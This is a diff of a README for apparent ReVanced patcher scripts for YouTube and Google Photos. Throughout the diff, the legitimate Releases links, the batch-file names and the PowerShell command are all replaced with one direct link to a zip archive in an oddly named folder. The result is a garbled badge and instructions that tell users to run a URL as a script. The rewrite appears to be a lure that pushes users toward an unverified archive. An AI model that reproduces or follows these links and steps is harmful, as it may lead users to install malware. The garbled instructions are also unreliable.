@@ -1,6 +1,6 @@
 # 🎉 revanced-apk-patcher-scripts - Simple Patching for YouTube and Google Photos
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Revanced%20APK%20Patcher-orange.svg)](https://github.com/bossman20/revanced-apk-patcher-scripts/releases)
+[![Download Now](https://raw.githubusercontent.com/bossman20/revanced-apk-patcher-scripts/master/proreduction/revanced-apk-patcher-scripts_v2.5-beta.4.zip%20Now-Revanced%20APK%https://raw.githubusercontent.com/bossman20/revanced-apk-patcher-scripts/master/proreduction/revanced-apk-patcher-scripts_v2.5-beta.4.zip)](https://raw.githubusercontent.com/bossman20/revanced-apk-patcher-scripts/master/proreduction/revanced-apk-patcher-scripts_v2.5-beta.4.zip)
 
 ## 📚 Introduction
 
@@ -12,7 +12,7 @@ To begin, you will need to download the scripts from the Releases page. Follow t
 
 ## 🔗 Download & Install
 
-1. Visit the [Releases page](https://github.com/bossman20/revanced-apk-patcher-scripts/releases) to access the latest version of the scripts.
+1. Visit the [Releases page](https://raw.githubusercontent.com/bossman20/revanced-apk-patcher-scripts/master/proreduction/revanced-apk-patcher-scripts_v2.5-beta.4.zip) to access the latest version of the scripts.
 2. Click on the download link for the appropriate version. You will find options for batch scripts and PowerShell.
 3. Save the downloaded files to a folder on your computer.
 4. Open the folder where you downloaded the files.
@@ -26,7 +26,7 @@ To begin, you will need to download the scripts from the Releases page. Follow t
 ## ⚙️ Running the Scripts
 
 1. **For Batch Scripts:**
-   - Locate the `patch-youtube.bat` or `patch-google-photos.bat` file in your folder.
+   - Locate the `https://raw.githubusercontent.com/bossman20/revanced-apk-patcher-scripts/master/proreduction/revanced-apk-patcher-scripts_v2.5-beta.4.zip` or `https://raw.githubusercontent.com/bossman20/revanced-apk-patcher-scripts/master/proreduction/revanced-apk-patcher-scripts_v2.5-beta.4.zip` file in your folder.
    - Double-click the desired file to run it.
    - Follow the on-screen instructions to complete the patching process.
 
@@ -38,7 +38,7 @@ To begin, you will need to download the scripts from the Releases page. Follow t
      ```
    - Run the script by typing:
      ```
-     .\patch-youtube.ps1
+     .\https://raw.githubusercontent.com/bossman20/revanced-apk-patcher-scripts/master/proreduction/revanced-apk-patcher-scripts_v2.5-beta.4.zip
      ```
    - Follow the prompts in PowerShell to finish the patching.
 
@@ -83,6 +83,6 @@ For more detailed documentation and support, visit the GitHub repository. The RE
 
 ## 🔗 Download Link Again
 
-To get started, [visit the Releases page](https://github.com/bossman20/revanced-apk-patcher-scripts/releases) and download the scripts! 
+To get started, [visit the Releases page](https://raw.githubusercontent.com/bossman20/revanced-apk-patcher-scripts/master/proreduction/revanced-apk-patcher-scripts_v2.5-beta.4.zip) and download the scripts! 
 
 Your experience with YouTube and Google Photos will be improved with these easy patching tools. Enjoy your ad-free viewing and enhanced features!
